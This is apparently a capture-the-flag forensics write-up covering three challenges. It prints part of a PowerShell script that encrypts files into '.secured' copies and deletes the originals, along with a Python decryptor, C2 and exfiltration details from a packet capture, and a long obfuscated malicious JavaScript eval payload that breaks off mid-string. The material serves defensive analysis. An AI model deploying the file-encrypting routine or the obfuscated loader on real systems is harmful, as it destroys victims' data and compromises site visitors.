    param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx)

    if ($t90Vv -eq $null -or $t90Vv.Length -eq 0) {
        return $null
    }

    $y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw)
    $z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx)
    $a34Vc = l34Vn $t90Vv $y90Va $z12Vb

    return [Convert]::ToBase64String($a34Vc)
}

function o12Vq {
    param([switch]$p34Vr)

    try {
        if ($p34Vr) {
            foreach ($q56Vs in l56Vn) {
                $d34Vp = "dca01aq2/"
                if (Test-Path $d34Vp) {
                    Get-ChildItem -Path $d34Vp -Recurse -ErrorAction Stop |
                        Where-Object { $_.Extension -match "^\.$q56Vs$" } |
                        ForEach-Object {
                            $r78Vt = $_.FullName
                            if (Test-Path $r78Vt) {
                                $s90Vu = [IO.File]::ReadAllBytes($r78Vt)
                                $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
                                [IO.File]::WriteAllText("$r78Vt.secured", $t12Vv)
                                Remove-Item $r78Vt -Force
                            }
                        }
                }
            }
        }
    }
    catch {}
}

if ($env:USERNAME -eq "developer56546756" -and $env:COMPUTERNAME -eq "Workstation5678") {
    o12Vq -p34Vr
    n90Vp
}
```

#### Complete Python Decryption Script
```python
import base64
import os

def decode_base64(encoded_str):
    """Decodes a Base64 string into bytes."""
    return base64.b64decode(encoded_str)

def xor_decrypt(data, key1, key2):
    """Decrypts data using XOR with two keys."""
    decrypted = bytearray(len(data))
    for i in range(len(data)):
        k1 = key1[i % len(key1)]
        k2 = key2[i % len(key2)]
        decrypted[i] = data[i] ^ k1 ^ k2
    return bytes(decrypted)

def process_file(input_file_path, output_file_path, key1, key2):
    try:
        # Read encrypted data as Base64 string
        with open(input_file_path, 'rb') as file:
            encrypted_base64 = file.read().decode('utf-8', errors='replace').strip()
        
        # Decode Base64 to bytes
        encrypted_data = decode_base64(encrypted_base64)
        
        # Decrypt using the keys
        decrypted_data = xor_decrypt(encrypted_data, key1, key2)
        
        # Save decrypted data
        with open(output_file_path, 'wb') as out_file:
            out_file.write(decrypted_data)
        
        print(f"Decrypted: {output_file_path}")

    except Exception as e:
        print(f"Failed to decrypt {input_file_path}: {str(e)}")

def main():
    # Get the directory where this script is located
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Original Base64 keys from PowerShell
    key1_b64 = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
    key2_b64 = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

    # Process keys to match PowerShell's behavior
    key1 = decode_base64(key1_b64).decode('utf-8', errors='replace').encode('utf-8')
    key2 = decode_base64(key2_b64).decode('utf-8', errors='replace').encode('utf-8')

    # Find all .secured files in the script directory
    for filename in os.listdir(script_dir):
        if filename.lower().endswith('.secured'):
            input_path = os.path.join(script_dir, filename)
            output_path = os.path.join(script_dir, filename[:-8])  # Remove ".secured" (8 chars)
            
            print(f"\nProcessing: {filename}")
            process_file(input_path, output_path, key1, key2)

if __name__ == "__main__":
    main()
```

#### Decrypted Artifact
![](https://i.imgur.com/plOpHpT.png)

---

  

### ToolPie

  

> In the bustling town of Eastmarsh, Garrick Stoneforge’s workshop site once stood as a pinnacle of enchanted lock and toolmaking. But dark whispers now speak of a breach by a clandestine faction, hinting that Garrick’s prized designs may have been stolen. Scattered digital remnants cling to the compromised site, awaiting those who dare unravel them. Unmask these cunning adversaries threatening the peace of Eldoria. Investigate the incident, gather evidence, and expose Malakar as the mastermind behind this attack.

  

![](https://i.imgur.com/8AozCfx.png)


  

Flags: 
```
1. What is the IP address responsible for compromising the website?
194.59.6.66

2. What is the name of the endpoint exploited by the attacker?
execute

3. What is the name of the obfuscation tool used by the attacker?
Py-Fuscate

4. What is the IP address and port used by the malware to establish a connection with the Command and Control (C2) server?
13.61.7.218:55155

5. What encryption key did the attacker use to secure the data?
5UUfizsRsP7oOCAq

6. What is the MD5 hash of the file exfiltrated by the attacker?
8fde053c8e79cf7e03599d559f90b321
```

  
#### Analysis Overview  
We are given a PCAP file. Upon inspection, we observe requests originating from the IP `194.59.6.66` (attacker-controlled) targeting a server endpoint `/execute` via a malicious POST payload.  

![](https://i.imgur.com/1adq9bu.png)  

#### Payload Extraction  
The payload is extracted and decompressed using Python:  
```python  
import bz2  
import marshal  
import struct  
import dis  

compressed_data = b'BZh91AY&SY\x8d*w...'  

# Decompress the data  
decompressed_data = bz2.decompress(compressed_data)  
# Load the code object  
code_object = marshal.loads(decompressed_data)  
# Disassemble the code object to view bytecode  
print("Disassembled Code:")  
dis.dis(code_object)  
```  

#### Key Findings  
1. **C2 Server**: `13.61.7.218:55155`  
2. **Obfuscation Tool**: `Py-Fuscate`  
3. **Encryption Algorithm**: `AES-CBC`  
   - **User/Key**: Found in the packet capture (see images below).  
   - **Encryption Key**: `5UUfizsRsP7oOCAq`  

![](https://i.imgur.com/5eRdBHn.png)  
![](https://i.imgur.com/qmTUKHa.png)  
![](https://i.imgur.com/dj4nhtE.png)  

#### Decrypting Exfiltrated Data  
Using the encryption key and algorithm, we decrypt the exfiltrated data from the PCAP.  

1. Extract encrypted data with `tshark`:  
   ```bash  
   tshark -r capture.pcap -Y "ip.dst == 13.61.7.218 and tcp.dstport == 55155 and tcp.ack == 113" -T fields -e data > encrypted_data.txt  
   ```  

2. Decryption reveals a PDF file with the MD5 hash:  
   `8fde053c8e79cf7e03599d559f90b321`  

![](https://i.imgur.com/z4ZTCxt.png)  

---

  

### Tales for the Brave

  

> In Eldoria, a once-innocent website called “Tales for the Brave” has become the focus of unsettling rumors. Some claim it may secretly trap unsuspecting visitors, leading them into a complex phishing scheme. Investigators report signs of encrypted communications and stealthy data collection beneath its friendly exterior. You must uncover the truth, and protect Eldoria from a growing threat.

  

![](https://i.imgur.com/AhXFf78.png)


Flag: `HTB{APT_c0nsp1r4c13s_b3h1nd_b3n1gn_l00k1ng_s1t3s}`

#### Initial Observation
The webpage appears normal but contains obfuscated JavaScript:
![](https://i.imgur.com/Soxg7lG.png)

##### Obfuscated Malicious JavaScript
```javascript
var _$_9b39=(function(n,w){var r=n.length;var j=[];for(var e=0;e< r;e++){j[e]= n.charAt(e)};for(var e=0;e< r;e++){var d=w* (e+ 439)+ (w% 33616);var a=w* (e+ 506)+ (w% 38477);var v=d%r;var p=a%r;var x=j[v];j[v]= j[p];j[p]= x;w= (d+ a)% 3525268};var c=String.fromCharCode(127);var q='';var m='%';var t='#1';var o='%';var u='#0';var k='#';return j.join(q).split(m).join(c).split(t).join(o).split(u).join(k).split(c)})("Ats8ep%%e6Sr%prB%feUseEynatcc4%ad",1198358);;;;;;;;;;;;;eval(CryptoJS[_$_9b39[1]][_$_9b39[0]]({ciphertext:CryptoJS[_$_9b39[4]][_$_9b39[3]][_$_9b39[2]](btoa(unescape("\u0062\u00FB\u0033\u00C0\u00DC\u005C\u0051\u001F\u0062\u00F0\u0023\u0053\u0013\u007F\u0014\u003D\u0022\u00D4\u0049\u009A\u00F5\u005B\u0040\u00D3\u004B\u008F\u009D\u00AC\u00C8\u0035\u0009\u0009\u0066\u005A\u0086\u0083\u007E\u003D\u00CA\u00E6\u00CD\u0043\u0001\u00ED\u00B9\u0020\u0003\u0056\u00D3\u0015\u0023\u0001\u00AC\u0001\u00F9\u009E\u0024\u001A\u00BE\u00DF\u007F\u004A\u00D7\u0030\u0064\u00C2\u008F\u00BE\u00C9\u0000\u0043\u0027\u0070\u00DD\u0050\u006B\u00A7\u0099\u00AA\u00BC\u00BA\u0010\u00C3\u0031\u005E\u00C3\u00A7\u0024\u00C3\u0065\u0069\u00DB\u00A1\u00A8\u0079\u0093\u00E0\u0056\u00BD\u00C4\u0095\u00A1\u0092\u000A\u0046\u007B\u00CB\u0076\u00B6\u004B\u00EC\u00AF\u0070\u0098\u008F\u008F\u004B\u0033\u0040\u00F0\u0074\u0061\u00F9\u0076\u0009\u00BF\u0015\u005A\u007A\u00BE\u00B6\u009D\u0049\u005B\u0028\u0028\u000B\u00DD\u0043\u0092\u009F\u00D6\u0043\u00A1\u0083\u002B\u00B8\u00E6\u006B\u003B\u002C\u000A\u00D9\u0019\u0078\u005E\u00E8\u0092\u00E7\u00FD\u0028\u0079\u0046\u004D\u00EE\u0074\u00B7\u00FD\u0094\u00A9\u0084\u00E6\u0085\u00A0\u00A8\u00E1\u00A7\u0044\u009A\u004C\u0021\u0050\u0056\u008B\u00CC\u00AA\u00EF\u0076\u0065\u00CD\u0021\u0001\u0075\u0041\u006F\u009D\u00CB\u006E\u00A5\u0055\u00F4\u0033\u0043\u000A\u0083\u005C\u00F4\u00D9\u0025\u008A\u0098\u003A\u00C6\u0088\u00E1\u0076\u0035\u00EF\u00F9\u00D4\u00BD\u004E\u0048\u0028\u0056\u0069\u0040\u003C\u00B1\u0086\u009E\u00E1\u00D9\u00BE\u0084\u005E\u0022\u0054\u0026\u00FE\u0006\u0022\u0000\u00D8\u0083\u0089\u00F4\u0075\u0078\u0052\u009C\u00DA\u0098\u0037\u00BA\u0004\u0016\u0046\u00A6\u00AD\u0088\u001B\u00D4\u0016\u000B\u00B6\u00BF\u002F\u0061\u00C9\u009A\u0056\u0048\u001C\u0085\u0080\u006D\u0031\u0066\u00F9\u00FA\u002F\u00F1\u0036\u0079\u0020\u00E7\u00B2\u002F\u00B6\u00B9\u001E\u00A7\u00AC\u0097\u00C5\u0015\u008B\u00CA\u005A\u008A\u009A\u0033\u001D\u003E\u0086\u006F\u0015\u0043\u0076\u0067\u000A\u00D0\u0007\u009B\u00A1\u00BB\u002F\u0026\u00CA\u0030\u00EB\u0023\u0093\u00C7\u001D\u00AC\u0057\u0073\u002F\u0028\u004A\u00A5\u00EC\u00D1\u005B\u0045\u0077\u0030\u0047\u0008\u0097\u00C4\u003B\u001C\u00CB\u00E9\u0033\u00E9\u0013\u007B\u00F6\u00D1\u00A4\u000A\u00AA\u0090\u008E\u0041\u005E\u000F\u00FA\u00AB\u00F4\u0068\u0087\u00C8\u009C\u00A6\u0037\u0083\u00EC\u0021\u0056\u00D8\u00B1\u0095\u0010\u00CC\u008D\u0023\u000F\u0074\u002F\u007B\u0085\u0037\u006C\u00D8\u00C8\u000C\u006A\u003A\u00B3\u0071\u0029\u00AC\u00B9\u004D\u0011\u00EF\u0097\u00F8\u00E2\u0044\u00E5\u00BF\u00FC\u0053\u00CF\u0026\u00CE\u00F2\u0046\u0059\u0017\u004D\u008B\u00F1\u002C\u0089\u00E1\u0056\u0040\u0058\u00A8\u00AC\u009B\u00F2\u0063\u0086\u0085\u0073\u009F\u00B4\u00B5\u00B3\u0041\u0037\u00F8\u0034\u009C\u00F4\u0088\u0059\u00D0\u008E\u004A\u00B5\u00C6\u0066\u0044\u0042\u0026\u00F2\u0008\u0090\u00F8\u0075\u00A5\u006C\u0041\u008D\u00B8\u0061\u00D4\u00E8\u0089\u00DD\u0087\u0087\u0014\u00C9\u0093\u0013\u00FC\u007D\u007E\u00E5\u0048\u0043\u002E\u002E\u004D\u00E6\u0078\u00FA\u00A1\u00F7\u008F\u0095\u00EC\u00B3\u006F\u003A\u00CF\u00A7\u00BF\u00F3\u0051\u0094\u008B\u007C\u00A0\u0030\u009B\u0019\u00C0\u00FE\u003B\u0052\u0041\u00CB\u00AF\u0008\u00E2\u00A8\u00A3\u0027\u0075\u00DE\u00A8\u00FF\u005C\u0054\u008B\u0069\u0019\u00F5\u007B\u00A0\u00CF\u0065\u0079\u00B6\u00FC\u0099\u0037\u0043\u007C\u00CD\u007F\u0068\u00E6\u00D3\u00E7\u0084\u0093\u0010\u0088\u000F\u00B8\u0040\u001D\u001B\u0038\u00CA\u0010\u0043\u0003\u0094\u00BD\u0076\u00AF\u000C\u000D\u00DA\u009D\u0049\u000B\u005F\u003E\u00A2\u00F3\u00D5\u0045\u00F8\u00DD\u001E\u0057\u0003\u0053\u0044\u006B\u009E\u003B\u00A7\u00DF\u004A\u001A\u0040\u0094\u0080\u00EC\u00E8\u009B\u0010\u00E6\u0040\u0079\u0057\u0020\u009F\u00FF\u001F\u0042\u006D\u0057\u0055\u00A1\u003F\u0091\u006E\u00D7\u00F7\u00A2\u0089\u00F2\u007A\u000D\u0088\u005E\u00CE\u002D\u00C5\u00C3\u0001\u0071\u002A\u007A\u003D\u009C\u00F5\u00C3\u0080\u00CA\u002D\u0069\u004B\u005B\u0061\u00CD\u0055\u000F\u009C\u00C6\u00E6\u00FB\u0038\u00A1\u00FB\u00D1\u00BA\u0062\u00BE\u0031\u0072\u00EF\u00C0\u00D6\u0056\u00FF\u00DA\u00FE\u00CA\u0081\u0001\u0072\u00BC\u0025\u0079\u00B8\u007F\u0055\u00C5\u0071\u008C\u000C\u00D4\u0059\u0030\u0022\u00CC\u00C8\u005D\u005B\u0077\u0009\u00A2\u0038\u0054\u0013\u003F\u00BC\u00CD\u001F\u0039\u00DE\u001A\u0046\u0057\u0016\u0045\u001F\u00FF\u001E\u002F\u002C\u0032\u00EA\u0029\u0035\u00A1\u008B\u001B\u00F7\u0048\u00D6\u000A\u004C\u009F\u0044\u0093\u00D2\u002B\u0023\u00F9\u0022\u0044\u001C\u0012\u00D6\u0061\u0097\u00AF\u004B\u001E\u00DC\u000E\u0033\u00F3\u00A1\u00FA\u0050\u00CE\u0000\u0024\u0086\u00C9\u0045\u0061\u00A7\u00BC\u0074\u0096\u0058\u0087\u00B6\u00D4\u006A\u0087\u00BB\u0027\u00D8\u00B6\u0045\u007D\u0030\u0097\u0089\u005D\u0034\u0023\u0042\u005B\u003D\u00A0\u0012\u00F3\u0032\u00EA\u0040\u006B\u0023\u00EA\u00A9\u003D\u006C\u0013\u009B\u007A\u0096\u00CA\u0023\u00CC\u009C\u001A\u0083\u0058\u0004\u0098\u005F\u008B\u0048\u0001\u0091\u00CF\u008F\u00D0\u004F\u0092\u0015\u0076\u00C0\u0078\u0072\u000D\u0071\u0001\u0022\u0063\u00B6\u007D\u00E9\u00D3\u004B\u00A7\u008F\u00ED\u00F7\u0016\u00AB\u002D\u00B9\u0001\u00F2\u008B\u00E9\u002F\u0062\u00EE\u003C\u008D\u0040\u0016\u00C0\u00A7\u0017\u0065\u00B9\u002F\u009E\u00DC\u00E4\u00BC\u00FD\u00E7\u0023\u002C\u0066\u000A\u0024\u008C\u00F2\u00E4\u00AE\u00A3\u00C1\u0068\u007D\u001E\u0058\u000F\u0081\u00D5\u0047\u0010\u005B\u000A\u002A\u00B6\u0041\u003A\u00A8\u001D\u00DD\u0091\u0008\u007C\u005D\u00E1\u0013\u0002\u0004\u00B8\u0087\u00FA\u0019\u0009\u00B8\u00C1\u0044\u005D\u006E\u007D\u000E\u0092\u001E\u0034\u008D\u0076\u00B7\u00D4\u009E\u0059\u004C\u00CD\u0011\u002D\u0047\u00A0\u00EA\u002A\u0098\u0039\u00A5\u00DF\u008F\u0041\u00FF\u0000\u00C6\u003B\u00E0\u0025\u00F4\u0005\u00C0\u00FB\u005B\u0013\u0090\u0038\u00FA\u0031\u0037\u00BA\u0011\u006E\u00DB\u009A\u00BD\u0074\u004F\u0047\u0039\u00B8\u0047\u001E\u00F6\u00BF\u0008\u00E7\u0029\u004A\u0031\u00C8\u009F\u0099\u0045\u009A\u00B4\u00FF\u0009\u0052\u00BC\u00FE\u00C3\u006A\u0092\u007D\u000E\u00E4\u00A8\u000B\u007E\u0054\u000E\u0088\u00B2\u0058\u00F5\u00DD\u0044\u0054\u00F9\u0067\u0072\u00B0\u00DD\u00F6\u0047\u00C3\u00D5\u00A3\u00AE\u003C\u0051\u003E\u00DE\u0019\u00BC\u0041\u0065\u0024\u0067\u0045\u0075\u002E\u0008\u0086\u00AF\u0037\u00CD\u008B\u0000\u0062\u0063\u0069\u00C4\u003B\u0065\u00F7\u008A\u00C9\u0043\u00FC\u005E\u0080\u0058\u0046\u002A\u0059\u0074\u00D0\u0041\u00D3\u0069\u0027\u0045\u0053\u0001\u00A7\u00F4\u0065\u003C\u00D5\u00CE\u008E\u0066\u0077\u00A1\u00D8\u003B\u00EA\u0054\u003F\u003B\u00EE\u00E8\u00BD\u00B6\u0040\u00FE\u0009\u0071\u00DA\u001B\u007F\u00D4\u0019\u003E\u0065\u0062\u00F1\u00CA\u00EB\u0073\u0004\u0061\u00A4\u00B6\u006B\u0002\u0082\u00AA\u00DA\u00DA\u00FA\u007B\u0093\u005E\u0053\u0080\u0049\u0017\u008E\u00ED\u00EF\u0058\u0016\u005D\u0041\u006C\u0015\u0088\u0088\u0085\u00A6\u004D\u0003\u00A8\u0014\u001C\u000B\u0085\u0049\u0042\u006A\u00DA\u006C\u00CD\u00DD\u00C3\u0049\u00F7\u00E4\u0049\u0049\u0027\u0018\u00E4\u00A8\u0045\u0069\u00F5\u000A\u0009\u0045\u00CD\u00BC\u0075\u0047\u009A\u0056\u00BE\u002A\u0026\u00C0\u00E8\u007C\u004E\u000D\u003B\u00E8\u0017\u00BA\u0098\u008D\u0008\u0062\u0047\u00EC\u00D4\u0005\u00AD\u003D\u0094\u008B\u00A0\u0023\u0054\u0016\u00A9\u0022\u00E9\u00DD\u007A\u0046\u00D1\u0022\u0074\u0020\u0006\u004B\u006F\u0099\u003F\u004E\u00B1\u001C\u00D6\u0081\u00D9\u001C\u003D\u0099\u0086\u00EA\u00EF\u0084\u0088\u0044\u0060\u004D\u0048\u0039\u0099\u0015\u00D8\u00D4\u0029\u009F\u00E2\u0056\u00E4\u001A\u0008\u0049\u00A3\u009C\u0056\u00AE\u00AC\u0052\u0089\u0002\u00D8\u00FB\u007E\u0078\u006D\u00AF\u00E9\u0065\u0020\u00A4\u00C0\u0013\u007D\u00C0\u0085\u0072\u00CF\u00FB\u00DD\u00F9\u00C3\u00A7\u0097\u000E\u0048\u003D\u00ED\u00A8\u0055\u00FA\u0070\u00F3\u001F\u0034\u0012\u00E1\u00C4\u000D\u00A1\u0055\u000F\u008D\u0000\u0039\u00BE\u0070\u0078\u0005\u0051\u0030\u00BA\u0023\u00C2\u00F8\u006F\u0045\u0098\u00B5\u00BE\u00A5\u0031\u0007\u0078\u0097\u0078\u00B8\u002E\u00C0\u0069\u0037\u0099\u0019\u00E3\u007D\u0025\u0003\u002B\u00EF\u0008\u00AD\u0055\u0094\u00E2\u009F\u0008\u0016\u0078\u0029\u00A7\u0067\u0059\u006A\u000F\u0080\u008D\u00A4\u001F\u0003\u00BD\u00AE\u0071\u0057\u0043\u0049\u00D4\u0034\u0012\u00AD\u0069\u00E3\u0085\u001F\u002B\u0063\u00BB\u00A7\u00DF\u005C\u00C6\u000C\u0076\u000B\u0006\u003F\u00D9\u0086\u00B5\u00D4\u0095\u00D8\u0064\u00E4\u00FA\u00F8\u0038\u0023\u008D\u00E6\u00A8\u0022\u00B6\u0047\u00DD\u005E\u00D6\u00CE\u001D\u0084\u003E\u0088\u00A5\u00C7\u0071\u004E\u0009\u00CA\u0023\u00A6\u0078\u00FD\u00C2\u0053\u003F\u00FE\u00A1\u002B\u0051\u0000\u00E6\u00FF\u00C5\u0045\u0073\u00BA\u0061\u004A\u00AE\u00C8\u00CF\u0006\u0036\u0044\u00FE\u0072\u00BF\u00B1\u005C\u0051\u00EB\u0003\u00C9\u00F3\u0020\u00B8\u0071\u00FA\u0046\u009D\u001A\u00D4\u000F\u0072\u0082\u0094\u0045\u0016\u000E\u00AA\u00F6\u00E2\u000E\u00A1\u001B\u008C\u000A\u0082\u0049\u003E\u0093\u00CB\u0087\u00CB\u00E9\u009C\u00B0\u0030\u0036\u007A\u00A6\u002A\u0016\u0020\u00DB\u00B1\u009E\u008E\u0003\u00A8\u008E\u005B\u005B\u0099\u001C\u00EA\u002E\u00AB\u000D\u005D\u00A3\u00A0\u00E8\u00CA\u00D7\u000B\u0081\u003D\u002F\u0039\u0083\u006F\u006B\u000D\u003A\u0025\u00CC\u00EE\u00DE\u006C\u0037\u007D\u0044\u0062\u0062\u0033\u0047\u0082\u00D9\u000D\u00A3\u0095\u00E1\u00F5\u0043\u00F3\u00A4\u00F3\u006E\u0071\u0019\u0021\u00D6\u009E\u000C\u0080\u0007\u00E7\u0076\u0034\u00AC\u0019\u0021\u0019\u002B\u00D3\u00C2\u00F2\u0072\u002B\u00C6\u00A8\u0043\u00F6\u00D9\u00B9\u004F\u0067\u0097\u0093\u007B\u0040\u001E\u0004\u0020\u00FC\u003F\u00D3\u00AD\u0079\u006E\u00E9\u008C\u00C7\u00EA\u00A7\u0009\u0054\u009D\u0030\u0088\u0044\u0016\u0017\u0061\u00DC\u00F6\u0057\u00C5\u0080\u001B\u0000\u0026\u0033\u0034\u0079\u009C\u0021\u00BC\u00A7\u0032\u0083\u00D7\u0082\u00CA\u0029\u0031\u0000\u0085\u0031\u0045\u0009\u0002\u00D9\u00F8\u0025\u00D8\u00E4\u0019\u0003\u00FA\u00B8\u00A5\u009B\u0093\u001F\u00FC\u00E6\u002F\u00F0\u0018\u00A3\u0021\u00E4\u0071\u001D\u0018\u0014\u00E9\u0027\u007A\u0070\u0072\u00D7\u002D\u00E2\u00A7\u0048\u00F7\u009F\u0072\u00E2\u00C7\u0094\u00A9\u00D4\u00E7\u0004\u0092\u00F1\u0076\u001D\u0031\u00E7\u009D\u00D3\u0087\u00EF\u00D4\u00D8\u00C5\u001F\u00FF\u008B\u00E9\u0041\u00EA\u00E9\u002D\u005A\u006C\u00A8\u008E\u0076\u0072\u0072\u0015\u003C\u00E6\u0004\u0005\u00A1\u00C7\u0001\u00EF\u00BB\u0055\u006E\u0030\u0017\u00E4\u0076\u00F9\u00FA\u002C\u0064\u008D\u00AE\u000D\u0097\u00D8\u0040\u005A\u00C4\u0039\u00E4\u006A\u0011\u0012\u00B5\u0061\u00FE\u0016\u001F\u00BA\u0070\u005A\u003A\u008F\u0033\u0091\u00F6\u0016\u00E2\u00E1\u0076\u0088\u00B3\u0007\u0068\u0032\u00CC\u0040\u00FB\u00E5\u0029\u008C\u0052\u00FC\u00CB\u000A\u00DF\u00EC\u00FB\u00AA\u0034\u003C\u00A1\u00D4\u00A1\u004B\u00C7\u0072\u006F\u00CF\u0003\u0004\u00D7\u002E\u00C9\u00B5\u0096\u008F\u00C6\u0039\u0045\u00A2\u008F\u0087\u0011\u0078\u0052\u00E8\u0080\u0086\u0091\u0082\u00AC\u00E5\u004F\u000B\u0040\u00EE\u0081\u00F4\u0025\u0001\u008E\u0019\u00B8\u00D2\u0052\u0028\u00ED\u00E5\u0029\u00DD\u0076\u000A\u0002\u00B9\u003F\u00D8\u000E\u00EB\u003C\u00DA\u00A1\u005A\u006E\u009E\u001B\u006A\u0034\u002A\u0071\u0083\u005C\u0011\u00E2\u00B9\u00A8\u0047\u0046\u00A9\u005E\u0056\u0088\u0053\u003E\u00ED\u0028\u0019\u001A\u00E6\u0050\u00AA\u0095\u0017\u000F\u00C3\u002D\u00C1\u0088\u004E\u0025\u007D\u0004\u0017\u0098\u005B\u0030\u00A1\u001E\u003C\u00FC\u007B\u00D1\u000B\u00C9\u00B3\u00A0\u002E\u0065\u0080\u0034\u0084\u0022\u00D4\u0079\u0053\u007D\u00D0\u0002\u005B\u00A2\u0060\u009B\u00BD\u000A\u006D\u009B\u007D\u00D5\u00A6\u0067\u00C8\u006E\u007C\u006B\u0090\u00C8\u000D\u00E4\u0026\u002E\u00BF\u0044\u0009\u00D3\u000F\u0047\u0001\u003C\u006A\u0012\u008C\u0028\u00DC\u00F2\u0041\u00AF\u0032\u0012\u0087\u0007\u008E\u00AC\u0011\u00F7\u007D\u0007\u0027\u004C\u0097\u0010\u00B3\u00D1\u00B7\u00B7\u0055\u000E\u001F\u00EC\u0025\u0082\u00AA\u00D0\u00BE\u0068\u0022\u00C0\u00E3\u0073\u00A1\u0006\u00BE\u00DB\u00C3\u0015\u0048\u0093\u0036\u0043\u0046\u009C\u0024\u003F\u00FA\u005B\u003B\u0015\u00EA\u00EF\u00C1\u0060\u00A1\u0096\u00DD\u0019\u0099\u00F1\u000E\u0075\u00DC\u0010\u004F\u0084\u00EA\u00F9\u0064\u000A\u0093\u008F\u004E\u001D\u00F8\u00A8\u00E3\u0016\u003F\u00B8\u001C\u0069\u00FC\u007E\u00E5\u0067\u003F\u00B9\u00A7\u00E9\u008A\u0054\u0008\u0069\u008E\u00F3\u000F\u0099\u0078\u0089\u00E0\u0009\u00CE\u00C7\u00F9\u000E\u00AA\u009E\u00C4\u00DF\u003B\u0065\u0028\u0099\u0055\u0064\u00A0\u0065\u00CF\u006F\u001A\u008A\u00DE\u0060\u00EA\u00D8\u00FA\u00D1\u007F\u00F4\u00CA\u00CA\u00C7\u00D1\u006C\u002B\u00AF\u00C7\u00C1\u00A8\u009C\u00EA\u000D\u00B9\u0058\u00FA\u00BC\u0093\u002B\u006F\u00C8\u001C\u0012\u003B\u0071\u0063\u0023\u007B\u00EB\u0090\u0078\u0034\u0064\u009C\u0031\u00BF\u001B\u0042\u00CF\u0051\u00A7\u003E\u00A1\u005F\u0075\u00F3\u0026\u009B\u0000\u00D5\u0026\u00FE\u0077\u0038\u0085\u000C\u00E1\u00DB\u0096\u0020\u00C3\u0005\u00A0\u009E\u00BA\u0035\u00DD\u005D\u0011\u0095\u0020\u000F\u00DC\u00E0\u003F\u00C7\u0052\u00AB\u00EC\u0001\u00C0\u0021\u00BB\u0087\u0030\u0033\u00F1\u00A7\u008E\u0062\u00BF\u002E\u0076\u0050\u00CE\u005C\u005C\u0045\u008C\u0069\u00B9\u002C\u0084\u0080\u005F\u00DD\u00B9\u0030\u004D\u005C\u00FD\u002A\u00CD\u0003\u00AD\u00EF\u0088\u00C8\u005F\u0008\u008F\u00EF\u00EE\u0049\u00B6\u00C2\u00A3\u0094\u00BB\u00F1\u002A\u002E\u003F\u00C0\u006C\u0048\u00D2\u0056\u00E0\u004A\u0008\u004F\u0051\u00E3\u00C5\u0094\u00D7\u00E1\u004A\u0021\u000C\u0041\u0007\u0086\u0044\u00CA\u0019\u00E3\u00D8\u0095\u00A0\u00FE\u009E\u00C2\u00E1\u005E\u00BF\u00BB\u0002\u00A4\u0002\u006E\u0048\u00B6\u002C\u000B\u0067\u0072\u0062\u0002\u00B7\u00F3\u0042\u0082\u008C\u00E6\u0049\u00AC\u00F7\u0028\u00BE\u003C\u00E3\u005D\u0057\u00F3\u0073\u00F8\u0010\u00A7\u004F\u0099\u0062\u0029\u003D\u0015\u009D\u00C9\u008B\u00D7\u0001\u00C6\u0089\u0099\u00DF\u00B8\u00FA\u007F\u00AB\u0089\u0064\u0055\u0060\u0062\u005B\u00D1\u00E6\u003A\u00B2\u00DE\u0045\u00BD\u0083\u0018\u007D\u00DC\u00F0\u001E\u00DB\u00C1\u00D1\u00ED\u0041\u0010\u0057\u00D1\u0096\u0032\u00CA\u0022\u009A\u0060\u00FD\u0043\u001B\u00A8\u0073\u0082\u0041\u0037\u0002\u008F\u005B\u00CB\u0077\u001B\u0073\u003C\u0072\u00CD\u00E8\u007E\u008B\u0015\u0058\u00D5\u0010\u0003\u008A\u0015\u00C1\u00D3\u0050\u002C\u0065\u00F0\u00CE\u0020\u00E6\u005A\u009E\u00B7\u007C\u0010\u00BE\u0042\u0045\u006F\u00DC\u002E\u00D6\u00F8\u00BA\u0019\u005A\u00AB\u003C\u0025\u00C2\u008C\u0059\u0034\u009C\u0067\u00B2\u0093\u00DF\u00E7\u0095\u004F\u00B8\u0046\u000D\u0096\u0015\u002C\u00D6\u0004\u0079\u00FA\u0070\u003E\u00AD\u00FE\u0023\u0027\u00C3\u00F6\u00D1\u00D7\u00D5\u00F7\u00BD\u0048\u00CF\u0014\u0010\u0097\u0062\u00A3\u005E\u002B\u0093\u004E\u007B\u00F9\u00D4\u00D3\u0064\u001F\u00D7\u00F7\u0018\u00C0\u0083\u00A1\u00AC\u00C1\u00F0\u00BB\u0035\u006F\u0007\u0032\u0060\u003B\u00CB\u00D8\u0051\u0042\u00FC\u00F1\u0026\u003C\u0098\u0043\u006C\u00D1\u006E\u00B7\u0024\u0042\u00CE\u0016\u004D\u0040\u0010\u003D\u0092\u00A8\u00AB\u00C6\u00D0\u0078\u00EF\u0079\u003A\u0069\u0018\u002E\u00FE\u0089\u0023\u00FA\u0085\u00B7\u0052\u00F3\u007D\u006E\u00C3\u0092\u007A\u00D0\u005B\u008B\u00DD\u007C\u00DC\u002E\u007E\u0092\u00D0\u0065\u0008\u00CE\u00DF\u00FE\u00CC\u003D\u00C0\u00A1\u00C2\u00D6\u0020\u0005\u00A3\u0066\u00DD\u00CD\u00CC\u00E4\u0063\u00E0\u00DD\u00F3\u0018\u000D\u0075\u0007\u006D\u0066\u000A\u00AD\u00D2\u008C\u008F\u00B0\u0006\u00C8\u00C7\u00B1\u006B\u00DC\u00CC\u00C0\u00A1\u0065\u001D\u0072\u00BC\u0012\u0044\u0093\u000F\u00C0\u00A8\u00F7\u00B9\u00A9\u0091\u00B8\u0049\u005D\u00C7\u00B5\u002A\u0018\u0041\u004B\u0040\u0036\u009C\u0046\u0002\u00A6\u00C1\u0035\u008D\u008D\u00D0\u008F\u00ED\u00BA\u00CA\u0072\u0089\u00DC\u004A\u0008\u0067\u006F\u00F0\u0009\u0089\u00EE\u0012\u00C0\u0045\u0094\u003D\u00B4\u006F\u0069\u0047\u00C4\u005D\u00B8\u00E1\u00BC\u00E8\u005B\u0020\u00D1\u0080\u00B2\u00DC\u0026\u00CB\u0007\u0031\u0095\u0006\u002F\u000F\u0052\u0051\u0065\u0001\u00B0\u00ED\u00B2\u0011\u0029\u00FE\u0017\u0087\u00B3\u002B\u00BF\u0002\u0019\u00A1\u0034\u0048\u00C3\u0075\u004C\u0099\u00AE\u00D7\u00CC\u0048\u00F3\u00D5\u008A\u0021\u0